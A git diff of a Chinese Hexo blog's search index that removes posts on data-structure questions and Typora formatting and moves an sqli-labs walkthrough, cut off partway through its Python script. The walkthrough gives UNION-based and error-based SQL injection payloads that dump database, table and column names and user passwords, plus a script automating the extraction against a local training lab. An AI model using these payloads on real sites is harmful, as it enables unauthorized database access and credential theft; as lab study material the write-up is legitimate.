@@ -1098,40 +1098,6 @@ http://url/CVS/Entries 返回所有文件的结构
       </tags>
   </entry>
   <entry>
-    <title>数据结构疑问</title>
-    <url>/2021/03/16/DSQuestion/</url>
-    <content><![CDATA[<p>记录《数据结构》中的一些问题</p>
-<h4 id="1-时间复杂度O-1-与O-n-的区别？"><a href="#1-时间复杂度O-1-与O-n-的区别？" class="headerlink" title="1.时间复杂度O(1)与O(n)的区别？"></a>1.时间复杂度O(1)与O(n)的区别？</h4><p><img src="/2021/03/16/DSQuestion/image-20210316215804952.png" alt="image-20210316215804952"></p>
-<p><img src="/2021/03/16/DSQuestion/image-20210316220103135.png" alt="image-20210316220103135"></p>
-<h4 id="2-随机存取"><a href="#2-随机存取" class="headerlink" title="2.随机存取"></a>2.随机存取</h4><p>根据存储位置是否可计算（是否有一个计算地址的公式）来判断该数据结构是否具备随机存取的特性，如数组知道首地址就可计算后面所有元素的地址</p>
-<h4 id="第四章-数组和特殊矩阵"><a href="#第四章-数组和特殊矩阵" class="headerlink" title="第四章  数组和特殊矩阵"></a>第四章  数组和特殊矩阵</h4><h5 id="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"><a href="#对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？" class="headerlink" title="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"></a>对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？</h5><p>文件压缩有很多种，包含了稀疏矩阵</p>
-<h5 id="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"><a href="#为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除" class="headerlink" title="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"></a>为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除</h5><p>数组是静态数据结构，本质上没有插入和删除运算</p>
-<h5 id="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"><a href="#为什么稀疏矩阵压缩存储后，必会失去随机存取功能？" class="headerlink" title="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"></a>为什么稀疏矩阵压缩存储后，必会失去随机存取功能？</h5><p>因为在这种矩阵中，非零元素的分布是没有规律的，为了压缩存储，就将每一个非零元素的值和它所在的行、列号做为一个结点存放在一起，这样的结点组成的线性表中叫三元组表，它已不是简单的向量，所以无法用下标直接存取矩阵中的元素（没有一个计算公式）。</p>
-<h5 id="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"><a href="#动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？" class="headerlink" title="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"></a>动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？</h5><p>先申请一块指定大小的内存块区域</p>
-<h5 id="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"><a href="#动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？" class="headerlink" title="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"></a>动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？</h5><img src="/2021/03/16/DSQuestion/image-20210318140952671.png" alt="image-20210318140952671" style="zoom:80%;">
-
-<p>无论是动态数组还是静态数组，数组长度确定下来后存储空间就确定了，所以静态和动态数组都是静态数据结构</p>
-<p>静态数据结构通常不会去定义插入、删除操作</p>
-<p><img src="/2021/03/16/DSQuestion/image-20210318141309092.png" alt="image-20210318141309092"></p>
-<h5 id="假如数组下标不是从0开始，而是从1开始，会影响到什么？"><a href="#假如数组下标不是从0开始，而是从1开始，会影响到什么？" class="headerlink" title="假如数组下标不是从0开始，而是从1开始，会影响到什么？"></a>假如数组下标不是从0开始，而是从1开始，会影响到什么？</h5><p>lacation计算里会出现一个-1计算</p>
-<h5 id="n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？"><a href="#n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？" class="headerlink" title="n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？"></a>n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？</h5><p>n、t都是可变的，是<strong>变量</strong>，所以不能写成O(1)，又不知道n、t哪个大，所以不能写成O(n)或者O(t).在某些情况下，如果知道n,t的大小情况的话是可以写成O(较大的那个)</p>
-<h5 id="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"><a href="#我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？" class="headerlink" title="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"></a>我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？</h5><p>更节省空间的暂无</p>
-<p>更易进行矩阵运算的有很多（分块啥的）</p>
-<h5 id="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"><a href="#用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？" class="headerlink" title="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"></a>用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？</h5><h5 id="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"><a href="#如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？" class="headerlink" title="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"></a>如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？</h5><p>可以查查matlab是怎么实现的</p>
-<h5 id="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"><a href="#C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？" class="headerlink" title="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"></a>C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？</h5><img src="/2021/03/16/DSQuestion/image-20210318140758524.png" alt="image-20210318140758524" style="zoom:80%;">
-
-<h5 id="稀疏矩阵的快速转置算法“快速”的代价是什么？"><a href="#稀疏矩阵的快速转置算法“快速”的代价是什么？" class="headerlink" title="稀疏矩阵的快速转置算法“快速”的代价是什么？"></a>稀疏矩阵的快速转置算法“快速”的代价是什么？</h5><p>存储空间增加了</p>
-<h5 id="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"><a href="#稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗" class="headerlink" title="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"></a>稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗</h5><p>按书上那么做的话是必要的</p>
-<p><img src="/2021/03/16/DSQuestion/image-20210318152228362.png" alt="image-20210318152228362"></p>
-]]></content>
-      <categories>
-        <category>数据结构</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Google AI Studio部署自己的应用</title>
     <url>/2026/01/05/Gemini%E7%94%9F%E6%88%90%E5%B9%B6%E9%83%A8%E7%BD%B2%E8%87%AA%E5%B7%B1%E7%9A%84%E5%BA%94%E7%94%A8/</url>
     <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
@@ -5126,136 +5092,6 @@ class Solution {
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs-master 刷题记录</title>
-    <url>/2020/10/18/sqlilab/</url>
-    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
-<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
-<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
-<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
-<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
-<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
-<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
-<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
-<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
-<p>例如数字型语句：select * from table where id =3</p>
-<p>则字符型如下：select * from table where name=’admin’</p>
-<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号：select * from table where name=’admin’’</p>
-<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
-<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
-<p>Mysql 有三种常用注释符：</p>
-<p>– 注意，这种注释符后边有一个空格</p>
-<p># 通过#进行注释 即**%23**</p>
-<p>/* */ 注释掉符号内的内容</p>
-<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
-<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
-<p><code>?id=1 order by 3--+</code></p>
-<p>查看所有的数据库：</p>
-<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
-<p>查看所有的表：</p>
-<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
-<p>查看所有的字段：</p>
-<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
-<p>查看所有用户名和密码：</p>
-<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
-<p>（0x7e相当于’~’）</p>
-<blockquote>
-<p><strong>concat()函数</strong></p>
-<p>功能：将多个字符串连接成一个字符串。</p>
-<p>语法：concat(str1, str2,…)</p>
-<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
-<p>举例：</p>
-<p>select concat (id, name, score) as info from tt2;</p>
-<p><strong>concat_ws()函数</strong></p>
-<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
-<p>语法：concat_ws(separator, str1, str2, …)</p>
-<p><strong>group_concat()函数</strong></p>
-<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
-<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
-<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
-</blockquote>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
-
-<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
-
-<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
-<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
-
-<p><strong>构造id=-1’)</strong></p>
-<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
-<blockquote>
-<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
-</blockquote>
-<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
-$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
-</code></pre>
-<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-$id=1;
-$id = '"' . $id . '"';
-echo($id);            //"1"
-</code></pre>
-<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
-<p>构造**?id=-1”)** </p>
-<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
-<pre><code class="line-numbers language-python">import requests
-from bs4 import BeautifulSoup
-db_name = ''
-table_list = []
-column_list = []
-url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
-### 获取当前数据库名 ###
-print('当前数据库名:')
-payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
-r = requests.get(url+payload)
-db_name = r.text.split(':')[-2]
-print('[+]' + db_name)
-### 获取表名 ###
-print('数据库%s下的表名:' % db_name)
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
-    r = requests.get(url+payload)
-    if 'group_key' not in r.text:
-        break
-    table_name = r.text.split(':')[-2]
-    table_list.append(table_name)
-    print('[+]' + table_name)
-### 获取列名 ###
-#### 这里以users表为例 ####
-print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    column_name = r.text.split(':')[-2]
-    column_list.append(column_name)
-    print('[+]' + column_name)
-### 获取字段值 ###
-#### 这里以username列为例 ####
-print('%s列下的字段值:' % column_list[-2])
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
-    r = requests.get(url + payload)
-    if 'group_key' not in r.text:
-        break
-    dump = r.text.split(':')[-2]
-    print('[+]' + dump)
-</code></pre>
-<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MoeCTF wp</title>
     <url>/2020/08/14/moectf/</url>
     <content><![CDATA[<img src="/2020/08/14/moectf/image-20200816135721888.png" alt="image-20200816135721888" style="zoom:50%;">
@@ -5436,85 +5272,6 @@ if (isset($a) &amp;&amp; !is_numeric($a) &amp;&amp; $a == 114514) {
       </categories>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>尝试用typora写博客</title>
-    <url>/2020/07/03/typora/</url>
-    <content><![CDATA[<p>​    昨天花了一番时间搭建好博客后，匆匆用记事本写了一句话作为纪念，将其作为第一条博客测试了一下。成功了，但是总觉得那样写博客有些低效，而且怎么把它搞得花里胡哨呢<span class="github-emoji"><span>❓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<span id="more"></span>
-
-<p>​    在大佬的安利之下，我发现了 <strong>Trpora</strong> 这个强大的软件，今天就用它来写这篇博客。（第一次使用，用意不在内容，而是想测试一下各种花里胡哨的东西​ <span class="github-emoji"><span>😄</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>）</p>
-<p>​    话不多说，测试开始</p>
-<p><span class="github-emoji"><span>🥊</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f94a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<ul>
-<li><h4 id="首先，测试一下图片的插入-arrow-down-small"><a href="#首先，测试一下图片的插入-arrow-down-small" class="headerlink" title="首先，测试一下图片的插入:arrow_down_small:"></a>首先，测试一下图片的插入<span class="github-emoji"><span>🔽</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f53d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><p><img src="/2020/07/03/typora/wallhaven-ox7695.jpg"></p>
-</li>
-<li><p><img src="/2020/07/03/typora/wallhaven-49e9zx.jpg"></p>
-</li>
-</ul>
-<p><strong>美汁儿汁儿</strong><span class="github-emoji"><span>🤙</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f919.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<ul>
-<li><h4 id="接着测试一下超链接"><a href="#接着测试一下超链接" class="headerlink" title="接着测试一下超链接"></a>接着测试一下超链接</h4><p><a href="http://www.baidu.com/">百度</a></p>
-<p>ojbk<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-</li>
-<li><h4 id="搞点代码恰恰-grey-question"><a href="#搞点代码恰恰-grey-question" class="headerlink" title="搞点代码恰恰:grey_question:"></a>搞点代码恰恰<span class="github-emoji"><span>❔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2754.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><p><code>printf("hello world!");</code></p>
-</li>
-</ul>
-<pre><code class="line-numbers language-c">#include &lt;stdio.h&gt;
-int main()
-{
-    printf("welcome!");
-}
-</code></pre>
-<ul>
-<li><h4 id="再整个表？听说Typora这个功能很强啊-black-flag"><a href="#再整个表？听说Typora这个功能很强啊-black-flag" class="headerlink" title="再整个表？听说Typora这个功能很强啊 :black_flag:"></a>再整个表？听说Typora这个功能很强啊 <span class="github-emoji"><span>🏴</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f3f4.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><p><code>ctrl+T</code> 插入表格</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>不知道该制个啥表，先空着吧，网上复制一个去(这功能tql)</p>
-<p>好家伙，找半天，没找到合适的，，，，以后再说吧</p>
-</li>
-</ul>
-<ul>
-<li><h4 id="引用点东西水一水字数-cold-sweat"><a href="#引用点东西水一水字数-cold-sweat" class="headerlink" title="引用点东西水一水字数:cold_sweat:"></a>引用点东西水一水字数<span class="github-emoji"><span>😰</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></h4><blockquote>
-<p>​        寂坐时，常想到晚明张岱。他写湖心亭：“崇祯五年十二月，余住西湖。大雪三日，湖中人鸟声俱绝。是日更定矣，余拿一小舟，拥毳衣炉火，独往湖心亭看雪。雾淞沆砀，天与云、与山、与水，上下一白。湖上影子，惟长堤一痕，湖心亭一点，与余舟一芥，舟中人两三粒而已。”</p>
-<p>​        深夜独自到湖上看大雪，他显然不觉寂寞——寂寞可能是美学的必要。但是，国破家亡、人事全非、当他在为自己写墓志铭的时候呢？</p>
-<p>​        蜀人张岱，陶庵其号也。少为纨绔子弟，极爱繁华，好精舍，好美婢，好娈童，好鲜衣，好美食，好骏马，好华灯，好烟火，好梨园，好鼓吹，好古董，好花鸟，兼以茶淫橘虐，书蠹诗魔，劳碌半生，皆成梦幻。年至五十，国破家亡，避迹山居。所存者，破床碎几，折鼎病琴与残书数帙，缺砚一方而已。布衣疏莨，常至断炊。回首二十年前，真如隔世。</p>
-<p>​        有一种寂寞，身边添一个可谈的人，一条知心的狗，或许就可以消减。有一种寂寞，茫茫天地之间“余舟一芥”的无边无际无着落，或许只能各自孤独面对，素颜修行吧。</p>
-<p>​                                                                                                                                                            ——龙应台《寂寞》</p>
-</blockquote>
-<hr>
-<p>OK，测试暂且到这吧，以后常用的大概就这些了。U1S1，Typora的确是个宝藏软件<span class="github-emoji"><span>🖕</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f595.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>Typora</tag>
       </tags>
   </entry>
   <entry>
@@ -5914,6 +5671,215 @@ xctf Object            //$res2
       <tags>
         <tag>Web</tag>
         <tag>PHP反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs-master 刷题记录</title>
+    <url>/2020/10/18/sqlilab/</url>
+    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
+<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
+<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
+<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
+<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
+<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
+<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
+<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
+<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>例如数字型语句：select * from table where id =3</p>
+<p>则字符型如下：select * from table where name=’admin’</p>
+<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
+<p>测试步骤：</p>
+<p>（1） 加单引号：select * from table where name=’admin’’</p>
+<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
+<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
+<p>Mysql 有三种常用注释符：</p>
+<p>– 注意，这种注释符后边有一个空格</p>
+<p># 通过#进行注释 即**%23**</p>
+<p>/* */ 注释掉符号内的内容</p>
+<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
+<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
+<p><code>?id=1 order by 3--+</code></p>
+<p>查看所有的数据库：</p>
+<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
+<p>查看所有的表：</p>
+<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
+<p>查看所有的字段：</p>
+<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
+<p>查看所有用户名和密码：</p>
+<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
+<p>（0x7e相当于’~’）</p>
+<blockquote>
+<p><strong>concat()函数</strong></p>
+<p>功能：将多个字符串连接成一个字符串。</p>
+<p>语法：concat(str1, str2,…)</p>
+<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p>举例：</p>
+<p>select concat (id, name, score) as info from tt2;</p>
+<p><strong>concat_ws()函数</strong></p>
+<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
+<p>语法：concat_ws(separator, str1, str2, …)</p>
+<p><strong>group_concat()函数</strong></p>
+<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
+<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
+</blockquote>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
+
+<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
+
+<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
+<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
+
+<p><strong>构造id=-1’)</strong></p>
+<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
+<blockquote>
+<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
+</blockquote>
+<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
+$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+</code></pre>
+<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+$id=1;
+$id = '"' . $id . '"';
+echo($id);            //"1"
+</code></pre>
+<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
+<p>构造**?id=-1”)** </p>
+<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
+<pre><code class="line-numbers language-python">import requests
+from bs4 import BeautifulSoup
+db_name = ''
+table_list = []
+column_list = []
+url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
+### 获取当前数据库名 ###
+print('当前数据库名:')
+payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
+r = requests.get(url+payload)
+db_name = r.text.split(':')[-2]
+print('[+]' + db_name)
+### 获取表名 ###
+print('数据库%s下的表名:' % db_name)
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
+    r = requests.get(url+payload)
